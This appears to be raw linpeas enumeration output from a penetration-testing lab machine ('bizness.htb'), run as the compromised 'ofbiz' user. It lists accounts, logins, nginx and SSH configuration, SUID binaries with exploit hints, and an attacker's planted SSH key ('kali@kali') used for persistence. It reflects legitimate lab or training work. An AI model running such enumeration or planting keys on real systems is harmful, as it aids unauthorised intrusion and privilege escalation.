tcp6       0      0 :::443                  :::*                    LISTEN      -                   
tcp6       0      0 :::35877                :::*                    LISTEN      65760/java          
tcp6       0      0 127.0.0.1:8009          :::*                    LISTEN      868/java            

╔══════════╣ Can I sniff with tcpdump?
No                                                                           
                                                                             


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                       
                               ╚═══════════════════╝                         
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users     
uid=1001(ofbiz) gid=1001(ofbiz-operator) groups=1001(ofbiz-operator)         

╔══════════╣ Do I have PGP keys?
gpg Not Found                                                                
netpgpkeys Not Found                                                         
netpgp Not Found                                                             
                                                                             
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                          
                                                                             
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                                                    
ptrace protection is disabled (0), so sudo tokens could be abused            

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                
                                                                             
╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                              

╔══════════╣ Users with console
ofbiz:x:1001:1001:,,,:/home/ofbiz:/bin/bash                                  
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                       
uid=1001(ofbiz) gid=1001(ofbiz-operator) groups=1001(ofbiz-operator)
uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=101(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=102(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=103(messagebus) gid=109(messagebus) groups=109(messagebus)
uid=104(systemd-timesync) gid=110(systemd-timesync) groups=110(systemd-timesync)                                                                          
uid=105(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=998(_laurel) gid=998(_laurel) groups=998(_laurel)
uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)                                                                          
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 16:48:48 up  7:28,  1 user,  load average: 0.26, 0.30, 0.16                 
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ofbiz    pts/3    10.10.14.244     16:44    4:24   0.02s  0.02s -bash

╔══════════╣ Last logons
ofbiz    pts/3        Mon Jan 15 16:44:21 2024   still logged in                       10.10.14.244
ofbiz    pts/3        Mon Jan 15 16:44:07 2024 - Mon Jan 15 16:44:09 2024  (00:00)     10.10.14.244
ofbiz    pts/1        Mon Jan 15 11:55:45 2024 - Mon Jan 15 11:56:31 2024  (00:00)     10.10.14.110
reboot   system boot  Mon Jan 15 09:20:28 2024   still running                         0.0.0.0
ofbiz    pts/0        Mon Jan  8 05:31:22 2024 - Mon Jan  8 05:32:18 2024  (00:00)     10.10.14.23
reboot   system boot  Mon Jan  8 05:23:10 2024 - Mon Jan  8 05:32:47 2024  (00:09)     0.0.0.0

wtmp begins Mon Jan  8 05:23:10 2024

╔══════════╣ Last time logon each user
Username         Port     From             Latest                            
ofbiz            pts/3    10.10.14.244     Mon Jan 15 16:44:21 -0500 2024

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)   
                                                                             
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                
                                                                             


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                        
                             ╚══════════════════════╝                        
╔══════════╣ Useful software
/bin/base64                                                                  
/bin/curl
/bin/nc
/bin/nc.traditional
/bin/netcat
/bin/perl
/bin/ping
/bin/python3
/bin/sudo
/bin/wget

╔══════════╣ Installed Compilers
ii  antlr                                 2.7.7+dfsg-10                  all          language tool for constructing recognizers, compilers etc

╔══════════╣ Searching mysql credentials and exec
                                                                             
╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: apache2 Not Found                                            
httpd Not Found                                                              
                                                                             
Nginx version: 
══╣ Nginx modules
ngx_http_geoip_module.so                                                     
ngx_http_image_filter_module.so
ngx_http_xslt_filter_module.so
ngx_mail_module.so
ngx_stream_geoip_module.so
ngx_stream_module.so
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Dec 21 09:15 /etc/nginx/sites-enabled            
drwxr-xr-x 2 root root 4096 Dec 21 09:15 /etc/nginx/sites-enabled
lrwxrwxrwx 1 root root 34 Dec 14 14:49 /etc/nginx/sites-enabled/default -> /etc/nginx/sites-available/default                                             




-rw-r--r-- 1 root root 1447 May 29  2021 /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
        worker_connections 768;
}
http {
        sendfile on;
        tcp_nopush on;
        types_hash_max_size 2048;
        include /etc/nginx/mime.types;
        default_type application/octet-stream;
        ssl_prefer_server_ciphers on;
        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;
        gzip on;
        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;
}

-rw-r--r-- 1 root root 389 May 29  2021 /etc/default/nginx

-rwxr-xr-x 1 root root 4579 May 29  2021 /etc/init.d/nginx

-rw-r--r-- 1 root root 329 May 29  2021 /etc/logrotate.d/nginx

drwxr-xr-x 8 root root 4096 Dec 21 09:15 /etc/nginx
-rw-r--r-- 1 root root 1447 May 29  2021 /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
        worker_connections 768;
}
http {
        sendfile on;
        tcp_nopush on;
        types_hash_max_size 2048;
        include /etc/nginx/mime.types;
        default_type application/octet-stream;
        ssl_prefer_server_ciphers on;
        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;
        gzip on;
        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;
}
-rw-r--r-- 1 root root 1340 Dec 18 03:17 /etc/nginx/conf.d/ofbiz.conf
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    listen 443 ssl default_server;
    listen [::]:443 ssl default_server;
    ssl_certificate     /etc/ssl/certs/nginx-selfsigned.crt;
    ssl_certificate_key /etc/ssl/private/nginx-selfsigned.key;
    server_name _;
    return 301 https://bizness.htb$request_uri;
}
server {
    listen 80;
    listen [::]:80;
    server_name bizness.htb;
    return 301 https://bizness.htb$request_uri;
}
server {
    listen 443 ssl;
    listen [::]:443 ssl;
    server_name bizness.htb;
    ssl_certificate     /etc/ssl/certs/nginx-selfsigned.crt;
    ssl_certificate_key /etc/ssl/private/nginx-selfsigned.key;
    location @ofbiz {
        proxy_pass https://127.0.0.1:8443;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded_For $proxy_add_x_forwarded_for;
    }
    location ~* \.(js|css|png|jpg|jpeg|gif|ico|woff|svg|ttf|eot|otf)$ {
        root /var/www/static;
        try_files $uri $uri/ @ofbiz;
        expires 3d;
    }
    location / {
        root /opt/ofbiz/framework/images/webapp/images;
        try_files $uri $uri/ @ofbiz;
    }
}
-rw-r--r-- 1 root root 1125 May 29  2021 /etc/nginx/fastcgi.conf
fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;
fastcgi_param  QUERY_STRING       $query_string;
fastcgi_param  REQUEST_METHOD     $request_method;
fastcgi_param  CONTENT_TYPE       $content_type;
fastcgi_param  CONTENT_LENGTH     $content_length;
fastcgi_param  SCRIPT_NAME        $fastcgi_script_name;
fastcgi_param  REQUEST_URI        $request_uri;
fastcgi_param  DOCUMENT_URI       $document_uri;
fastcgi_param  DOCUMENT_ROOT      $document_root;
fastcgi_param  SERVER_PROTOCOL    $server_protocol;
fastcgi_param  REQUEST_SCHEME     $scheme;
fastcgi_param  HTTPS              $https if_not_empty;
fastcgi_param  GATEWAY_INTERFACE  CGI/1.1;
fastcgi_param  SERVER_SOFTWARE    nginx/$nginx_version;
fastcgi_param  REMOTE_ADDR        $remote_addr;
fastcgi_param  REMOTE_PORT        $remote_port;
fastcgi_param  REMOTE_USER        $remote_user;
fastcgi_param  SERVER_ADDR        $server_addr;
fastcgi_param  SERVER_PORT        $server_port;
fastcgi_param  SERVER_NAME        $server_name;
fastcgi_param  REDIRECT_STATUS    200;
-rw-r--r-- 1 root root 217 May 29  2021 /etc/nginx/snippets/snakeoil.conf
ssl_certificate /etc/ssl/certs/ssl-cert-snakeoil.pem;
ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
-rw-r--r-- 1 root root 423 May 29  2021 /etc/nginx/snippets/fastcgi-php.conf
fastcgi_split_path_info ^(.+?\.php)(/.*)$;
try_files $fastcgi_script_name =404;
set $path_info $fastcgi_path_info;
fastcgi_param PATH_INFO $path_info;
fastcgi_index index.php;
include fastcgi.conf;
lrwxrwxrwx 1 root root 60 Dec 14 14:49 /etc/nginx/modules-enabled/50-mod-http-xslt-filter.conf -> /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
load_module modules/ngx_http_xslt_filter_module.so;
lrwxrwxrwx 1 root root 48 Dec 14 14:49 /etc/nginx/modules-enabled/50-mod-mail.conf -> /usr/share/nginx/modules-available/mod-mail.conf                    
load_module modules/ngx_mail_module.so;
lrwxrwxrwx 1 root root 54 Dec 14 14:49 /etc/nginx/modules-enabled/50-mod-http-geoip.conf -> /usr/share/nginx/modules-available/mod-http-geoip.conf
load_module modules/ngx_http_geoip_module.so;
lrwxrwxrwx 1 root root 56 Dec 14 14:49 /etc/nginx/modules-enabled/70-mod-stream-geoip.conf -> /usr/share/nginx/modules-available/mod-stream-geoip.conf
load_module modules/ngx_stream_geoip_module.so;
lrwxrwxrwx 1 root root 61 Dec 14 14:49 /etc/nginx/modules-enabled/50-mod-http-image-filter.conf -> /usr/share/nginx/modules-available/mod-http-image-filter.conf
load_module modules/ngx_http_image_filter_module.so;
lrwxrwxrwx 1 root root 50 Dec 14 14:49 /etc/nginx/modules-enabled/50-mod-stream.conf -> /usr/share/nginx/modules-available/mod-stream.conf
load_module modules/ngx_stream_module.so;

-rw-r--r-- 1 root root 374 May 29  2021 /etc/ufw/applications.d/nginx

drwxr-xr-x 3 root root 4096 Dec 21 09:15 /usr/lib/nginx

-rwxr-xr-x 1 root root 1190896 Nov 11  2022 /usr/sbin/nginx

drwxr-xr-x 2 root root 4096 Dec 21 09:15 /usr/share/doc/nginx

drwxr-xr-x 4 root root 4096 Dec 21 09:15 /usr/share/nginx
-rw-r--r-- 1 root root 42 Nov 11  2022 /usr/share/nginx/modules-available/mod-stream.conf
load_module modules/ngx_stream_module.so;
-rw-r--r-- 1 root root 53 Nov 11  2022 /usr/share/nginx/modules-available/mod-http-image-filter.conf
load_module modules/ngx_http_image_filter_module.so;
-rw-r--r-- 1 root root 40 Nov 11  2022 /usr/share/nginx/modules-available/mod-mail.conf
load_module modules/ngx_mail_module.so;
-rw-r--r-- 1 root root 48 Nov 11  2022 /usr/share/nginx/modules-available/mod-stream-geoip.conf
load_module modules/ngx_stream_geoip_module.so;
-rw-r--r-- 1 root root 52 Nov 11  2022 /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
load_module modules/ngx_http_xslt_filter_module.so;
-rw-r--r-- 1 root root 46 Nov 11  2022 /usr/share/nginx/modules-available/mod-http-geoip.conf
load_module modules/ngx_http_geoip_module.so;

drwxr-xr-x 7 root root 4096 Dec 21 09:15 /var/lib/nginx

drwxr-xr-x 2 root adm 4096 Jan  3 04:43 /var/log/nginx


╔══════════╣ Analyzing FastCGI Files (limit 70)
-rw-r--r-- 1 root root 1055 May 29  2021 /etc/nginx/fastcgi_params           

╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                         
drwxr-xr-x 2 root root 4096 Dec 21 09:15 /etc/ldap

drwxr-xr-x 6 ofbiz ofbiz-operator 4096 Dec 21 09:15 /opt/ofbiz/build/classes/java/main/org/apache/ofbiz/ldap

drwxr-xr-x 6 ofbiz ofbiz-operator 4096 Dec 21 09:15 /opt/ofbiz/build/resources/main/org/apache/ofbiz/ldap

drwxr-xr-x 4 ofbiz ofbiz-operator 4096 Dec 21 09:15 /opt/ofbiz/plugins/ldap

drwxr-xr-x 6 ofbiz ofbiz-operator 4096 Dec 21 09:15 /opt/ofbiz/plugins/ldap/src/main/java/org/apache/ofbiz/ldap


╔══════════╣ Searching Log4Shell vulnerable libraries
                                                                             
╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                  
                                                                             



-rw-r--r-- 1 ofbiz ofbiz-operator 564 Jan 15 16:43 /home/ofbiz/.ssh/authorized_keys                                                                       
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCr5LhGYnyH8LIDuP8ldI9Iu4syPvRLhrz4jbh3f6CZIQsDwYu50DkPkmuUQip0RxcsuRz7zFoDgstL/O2BshHMHVwcqMXoFVFtCT9kVi1VeLzCVSAOFG1M55t3rN1aTB0LXKgYalUoDv+ELjp8HZwHbr3g7xse3wnTK60x0385Np0Wmh0vsm+TrPxrNixIidR/zTZUoR4cbM3fmHuGUeh1AvhVcIYoVlG7by7Msa1h3DG2DYbsEg+W672cErwVyNuB+GT6EwIPvfheveY4zRejlvZFCcYrqEJp5bZ20z05GICUQGmQXbI9VaSXBUGkYdBgoZ2uTzCMs0NxfSCFI27yMzQQpsn1GWJxXxDJkwURvrwIBbGR9dmVtcxEKX3rO5Wtc2BkXEXUYiULQEzw85TkV3fvY0Nnfu9+c3AyYKiqahxCZOQj42i7aRhkOuMUn1ZvMgaNE4bWRPyTf3PBfSn4qSoX/CDJ9SXkfjBulTHeGq3PItd14ACaTtKFP/ihiPs= kali@kali

-rw-r--r-- 1 root root 173 Nov  7 06:59 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 93 Nov  7 06:59 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 565 Nov  7 06:59 /etc/ssh/ssh_host_rsa_key.pub

ChallengeResponseAuthentication no
UsePAM yes
══╣ Some certificates were found (out limited):
/etc/ssl/certs/ACCVRAIZ1.pem                                                 
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/ca-certificates.crt
/etc/ssl/certs/CA_Disig_Root_R2.pem
/etc/ssl/certs/Certigna.pem
/etc/ssl/certs/Certigna_Root_CA.pem
98530PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                               
Include /etc/ssh/sshd_config.d/*.conf
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                             


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Jan  2 06:27 /etc/pam.d                          
-rw-r--r-- 1 root root 2133 Sep 23 18:13 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open




╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Dec 21 09:15 /usr/share/keyrings                 



-rw-r--r-- 1 ofbiz ofbiz-operator 2204 Oct 13 12:04 /opt/ofbiz/framework/base/config/ofbizrmi.jks
-rw-r--r-- 1 ofbiz ofbiz-operator 916 Oct 13 12:04 /opt/ofbiz/framework/base/config/ofbizrmi-truststore.jks
-rw-r--r-- 1 ofbiz ofbiz-operator 2427 Oct 13 12:04 /opt/ofbiz/framework/base/config/ofbizssl.jks
-rw-r--r-- 1 ofbiz ofbiz-operator 913 Oct 13 12:04 /opt/ofbiz/framework/service/config/rmitrust.jks

╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                               
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing Github Files (limit 70)
drwxr-xr-x 3 ofbiz ofbiz-operator 4096 Dec 21 09:15 /opt/ofbiz/.github       
drwxr-xr-x 2 ofbiz ofbiz-operator 4096 Dec 21 09:15 /opt/ofbiz/plugins/.github                                                                            




╔══════════╣ Analyzing PGP-GPG Files (limit 70)
gpg Not Found                                                                
netpgpkeys Not Found                                                         
netpgp Not Found                                                             
                                                                             
-rw-r--r-- 1 root root 8700 Mar 18  2023 /etc/apt/trusted.gpg.d/debian-archive-bookworm-automatic.gpg
-rw-r--r-- 1 root root 8709 Mar 18  2023 /etc/apt/trusted.gpg.d/debian-archive-bookworm-security-automatic.gpg
-rw-r--r-- 1 root root 280 Mar 18  2023 /etc/apt/trusted.gpg.d/debian-archive-bookworm-stable.gpg
-rw-r--r-- 1 root root 8700 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-automatic.gpg
-rw-r--r-- 1 root root 8709 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-security-automatic.gpg
-rw-r--r-- 1 root root 2453 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-stable.gpg
-rw-r--r-- 1 root root 8132 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-buster-automatic.gpg
-rw-r--r-- 1 root root 8141 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-buster-security-automatic.gpg
-rw-r--r-- 1 root root 2332 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-buster-stable.gpg
-rw-r--r-- 1 root root 8700 Mar 18  2023 /usr/share/keyrings/debian-archive-bookworm-automatic.gpg
-rw-r--r-- 1 root root 8709 Mar 18  2023 /usr/share/keyrings/debian-archive-bookworm-security-automatic.gpg
-rw-r--r-- 1 root root 280 Mar 18  2023 /usr/share/keyrings/debian-archive-bookworm-stable.gpg
-rw-r--r-- 1 root root 8700 Mar 18  2023 /usr/share/keyrings/debian-archive-bullseye-automatic.gpg
-rw-r--r-- 1 root root 8709 Mar 18  2023 /usr/share/keyrings/debian-archive-bullseye-security-automatic.gpg
-rw-r--r-- 1 root root 2453 Mar 18  2023 /usr/share/keyrings/debian-archive-bullseye-stable.gpg
-rw-r--r-- 1 root root 8132 Mar 18  2023 /usr/share/keyrings/debian-archive-buster-automatic.gpg
-rw-r--r-- 1 root root 8141 Mar 18  2023 /usr/share/keyrings/debian-archive-buster-security-automatic.gpg
-rw-r--r-- 1 root root 2332 Mar 18  2023 /usr/share/keyrings/debian-archive-buster-stable.gpg
-rw-r--r-- 1 root root 56156 Mar 18  2023 /usr/share/keyrings/debian-archive-keyring.gpg
-rw-r--r-- 1 root root 54031 Mar 18  2023 /usr/share/keyrings/debian-archive-removed-keys.gpg


╔══════════╣ Searching docker files (limit 70)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation                                   
-rw-r--r-- 1 ofbiz ofbiz-operator 1598 Oct 13 12:04 /opt/ofbiz/docker/examples/postgres-demo/docker-compose.yml
-rw-r--r-- 1 ofbiz ofbiz-operator 4980 Oct 13 12:04 /opt/ofbiz/Dockerfile


╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 761 Aug 12  2020 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing DNS Files (limit 70)
-rw-r--r-- 1 root root 826 Aug 12  2020 /usr/share/bash-completion/completions/bind
-rw-r--r-- 1 root root 826 Aug 12  2020 /usr/share/bash-completion/completions/bind                                                                       




╔══════════╣ Analyzing Interesting logs Files (limit 70)
lrwxrwxrwx 1 root root 9 Jan  3 04:43 /var/log/nginx/access.log -> /dev/null 

-rw-r--r-- 1 ofbiz ofbiz-operator 331133 Jan 15 16:36 /opt/ofbiz/runtime/logs/error.log
lrwxrwxrwx 1 root root 9 Jan  3 04:43 /var/log/nginx/error.log -> /dev/null

╔══════════╣ Analyzing Windows Files (limit 70)
                                                                             
















-rw-r--r-- 1 ofbiz ofbiz-operator 1943 Oct 13 12:04 /opt/ofbiz/applications/accounting/servicedef/groups.xml
-rw-r--r-- 1 ofbiz ofbiz-operator 1278 Oct 13 12:04 /opt/ofbiz/applications/product/servicedef/groups.xml
-rw-r--r-- 1 ofbiz ofbiz-operator 1661 Oct 13 12:04 /opt/ofbiz/framework/entityext/servicedef/groups.xml


































╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3526 Mar 27  2022 /etc/skel/.bashrc                   
-rw-r--r-- 1 ofbiz ofbiz-operator 3560 Dec 14 14:30 /home/ofbiz/.bashrc





-rw-r--r-- 1 root root 807 Mar 27  2022 /etc/skel/.profile
-rw-r--r-- 1 ofbiz ofbiz-operator 807 Dec 14 14:24 /home/ofbiz/.profile






                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                        
                      ╚════════════════════════════════════╝                 
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                          
strace Not Found                                                             
-rwsr-xr-x 1 root root 55K Jan 20  2022 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                               
-rwsr-xr-x 1 root root 71K Jan 20  2022 /usr/bin/su
-rwsr-xr-x 1 root root 35K Feb 26  2021 /usr/bin/fusermount
-rwsr-xr-x 1 root root 179K Jan 14  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                     
-rwsr-xr-x 1 root root 44K Feb  7  2020 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 52K Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 63K Feb  7  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)    
-rwsr-xr-x 1 root root 87K Feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 58K Feb  7  2020 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 35K Jan 20  2022 /usr/bin/umount  --->  BSD/Linux(08-1996)                                                                         
-rwsr-xr-x 1 root root 471K Dec 21 11:09 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51K Jun  6  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                 

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                          
-rwxr-sr-x 1 root shadow 38K Aug 26  2021 /usr/sbin/unix_chkpwd              
-rwxr-sr-x 1 root crontab 43K Feb 22  2021 /usr/bin/crontab
-rwxr-sr-x 1 root tty 35K Jan 20  2022 /usr/bin/wall
-rwxr-sr-x 1 root shadow 31K Feb  7  2020 /usr/bin/expiry
-rwxr-sr-x 1 root shadow 79K Feb  7  2020 /usr/bin/chage
-rwxr-sr-x 1 root mail 23K Feb  4  2021 /usr/bin/dotlockfile
-rwxr-sr-x 1 root ssh 347K Dec 21 11:09 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 23K Jan 20  2022 /usr/bin/write.ul (Unknown SGID binary)                                                                            

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so     
/etc/ld.so.conf                                                              
Content of /etc/ld.so.conf:                                                  
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf                                                
  - /usr/local/lib                                                           
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu                                          
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Capabilities                                                    
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                           
══╣ Current shell capabilities                                               
CapInh:  0x0000000000000000=                                                 
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
CapAmb:  0x0000000000000000=

══╣ Parent process capabilities
CapInh:  0x0000000000000000=                                                 
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
CapAmb:  0x0000000000000000=


Files with capabilities (limited to 50):
/usr/bin/ping cap_net_raw=ep

╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root 3448 Feb 19  2021 usr.bin.man                         

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls      
files with acls in searched folders Not Found                                
                                                                             
╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                                                         
total 12                                                                     
drwxr-xr-x  2 root root 4096 Dec 21 09:15 .
drwxr-xr-x 83 root root 4096 Jan 15 09:20 ..
-rw-r--r--  1 root root  726 Aug 12  2020 bash_completion.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                                           
                                                                             
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                 
═╣ Credentials in fstab/mtab? ........... No                                 
═╣ Can I read shadow files? ............. No                                 
═╣ Can I read shadow plists? ............ No                                 
═╣ Can I write shadow plists? ........... No                                 
═╣ Can I read opasswd file? ............. No                                 
═╣ Can I write in network-scripts? ...... No                                 
═╣ Can I read root folder? .............. No                                 
                                                                             
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                       
/home/ofbiz/user.txt
/home/ofbiz/.bash_history
/root/
/var/www
/var/www/html
/var/www/html/index.nginx-debian.html

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)                                                                      
-rw-r----- 1 root ofbiz-operator 33 Jan 15 09:20 /home/ofbiz/user.txt        
